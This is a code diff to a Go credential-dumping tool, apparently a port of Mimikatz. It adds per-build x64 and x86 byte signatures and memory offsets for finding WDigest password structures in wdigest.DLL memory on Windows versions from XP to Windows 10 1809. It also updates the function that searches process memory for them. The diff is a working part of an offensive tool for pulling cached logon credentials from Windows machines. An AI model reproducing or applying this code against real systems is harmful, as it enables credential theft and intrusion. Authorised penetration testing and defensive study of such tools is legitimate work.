@@ -15,19 +15,92 @@ import (
 )
 
 var (
-	patternWin5X64PasswordSet = []byte{0x48, 0x3B, 0xDA, 0x74}
-	patternWin6X64PasswordSet = []byte{0x48, 0x3B, 0xD9, 0x74}
-
-	patternWin64X86PasswordSet = []byte{0x74, 0x15, 0x8B, 0x0F, 0x39, 0x4E, 0x10}
-
-	wdigestReferences = map[uint32]*patchGeneric{
-		buildWinVista: {
+	patternWin5xX64PasswordSet = []byte{0x48, 0x3B, 0xDA, 0x74}
+	patternWin6xX64PasswordSet = []byte{0x48, 0x3B, 0xD9, 0x74}
+	// key = build
+	wdigestReferencesX64 = map[uint32]*patchGeneric{
+		buildWinXP: {
 			search: &patchPattern{
-				length: len(patternWin6X64PasswordSet),
-				data:   patternWin6X64PasswordSet,
+				length: len(patternWin5xX64PasswordSet),
+				data:   patternWin5xX64PasswordSet,
+			},
+			patch:   &patchPattern{length: 0, data: nil},
+			offsets: &patchOffsets{off0: -4, off1: 36},
+		},
+		buildWin2003: {
+			search: &patchPattern{
+				length: len(patternWin5xX64PasswordSet),
+				data:   patternWin5xX64PasswordSet,
 			},
 			patch:   &patchPattern{length: 0, data: nil},
 			offsets: &patchOffsets{off0: -4, off1: 48},
+		},
+		buildWinVista: {
+			search: &patchPattern{
+				length: len(patternWin6xX64PasswordSet),
+				data:   patternWin6xX64PasswordSet,
+			},
+			patch:   &patchPattern{length: 0, data: nil},
+			offsets: &patchOffsets{off0: -4, off1: 48},
+		},
+	}
+)
+
+var (
+	patternWin5xX86PasswordSet      = []byte{0x74, 0x18, 0x8B, 0x4D, 0x08, 0x8B, 0x11}
+	patternWin60X86PasswordSet      = []byte{0x74, 0x11, 0x8B, 0x0B, 0x39, 0x4E, 0x10}
+	patternWin63X86PasswordSet      = []byte{0x74, 0x15, 0x8B, 0x0A, 0x39, 0x4E, 0x10}
+	patternWin64X86PasswordSet      = []byte{0x74, 0x15, 0x8B, 0x0F, 0x39, 0x4E, 0x10}
+	patternWin10v1809X86PasswordSet = []byte{0x74, 0x15, 0x8b, 0x17, 0x39, 0x56, 0x10}
+	// key = build
+	wdigestReferencesX86 = map[uint32]*patchGeneric{
+		buildWinXP: {
+			search: &patchPattern{
+				length: len(patternWin5xX86PasswordSet),
+				data:   patternWin5xX86PasswordSet,
+			},
+			patch:   &patchPattern{length: 0, data: nil},
+			offsets: &patchOffsets{off0: -6, off1: 36},
+		},
+		buildWin2003: {
+			search: &patchPattern{
+				length: len(patternWin5xX86PasswordSet),
+				data:   patternWin5xX86PasswordSet,
+			},
+			patch:   &patchPattern{length: 0, data: nil},
+			offsets: &patchOffsets{off0: -6, off1: 28},
+		},
+		buildWinVista: {
+			search: &patchPattern{
+				length: len(patternWin60X86PasswordSet),
+				data:   patternWin60X86PasswordSet,
+			},
+			patch:   &patchPattern{length: 0, data: nil},
+			offsets: &patchOffsets{off0: -6, off1: 32},
+		},
+		buildMinWinBlue: {
+			search: &patchPattern{
+				length: len(patternWin63X86PasswordSet),
+				data:   patternWin63X86PasswordSet,
+			},
+			patch:   &patchPattern{length: 0, data: nil},
+			offsets: &patchOffsets{off0: -4, off1: 32},
+		},
+		buildMinWin10: {
+			search: &patchPattern{
+				length: len(patternWin64X86PasswordSet),
+				data:   patternWin64X86PasswordSet,
+			},
+			patch:   &patchPattern{length: 0, data: nil},
+			offsets: &patchOffsets{off0: -6, off1: 32},
+		},
+		buildWin10v1809: {
+			search: &patchPattern{
+				length: len(patternWin10v1809X86PasswordSet),
+				data:   patternWin10v1809X86PasswordSet,
+			},
+			patch:   &patchPattern{length: 0, data: nil},
+			offsets: &patchOffsets{off0: -6, off1: 32},
 		},
 	}
 )
@@ -44,7 +117,7 @@ func (kiwi *Kiwi) searchWdigestCredentialAddress(pHandle windows.Handle) error {
 		return errors.WithMessage(err, "failed to read memory about wdigest.DLL")
 	}
 	// search logon session list pattern
-	patch := wdigestReferences[buildWinVista]
+	patch := wdigestReferencesX64[buildWinVista]
 
 	index := bytes.Index(memory, patch.search.data)
 	if index == -1 {
